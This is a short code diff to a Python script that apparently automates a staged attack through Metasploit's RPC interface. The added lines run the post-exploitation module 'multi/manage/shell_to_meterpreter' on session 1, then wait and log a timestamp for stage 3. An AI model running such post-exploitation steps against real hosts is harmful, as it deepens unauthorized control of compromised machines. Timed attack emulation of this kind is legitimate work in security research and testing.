@@ -41,6 +41,13 @@ def main(argv):
     while client.jobs.list:
         time.sleep(1)
 
+    exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
+    exploit['SESSION'] = 1
+    exploit.execute()
+
+    while client.jobs.list:
+        time.sleep(1)
+
     time.sleep(10)
     output_time_file = 'time_stage_3_end.txt'
     record_timestamp(folder, output_time_file)
